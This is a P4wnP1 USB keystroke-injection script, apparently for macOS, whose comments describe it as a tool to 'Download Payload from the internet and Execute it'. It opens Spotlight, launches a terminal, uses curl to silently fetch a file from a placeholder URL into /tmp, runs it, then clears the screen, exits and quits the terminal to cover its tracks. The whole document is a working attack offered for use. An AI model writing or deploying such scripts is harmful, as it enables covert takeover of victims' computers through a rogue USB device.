// Download Payload from the internet and Execute it
// You need to setup P4wnP1 USB Gadget Settings as HID keyboard
// Change payload URL and file name to yours

layout("us");
press("GUI SPACE") 
delay(500) 
type("terminal")
delay(500)
press("ENTER") 
delay(500)
type("curl http://yoururl/payload  --output /tmp/payload --silent\n")
delay(5000)
type("/tmp/payload")
delay(500)
type("clear\n")
delay(500)
type("exit\n")
delay(500)
press("GUI Q")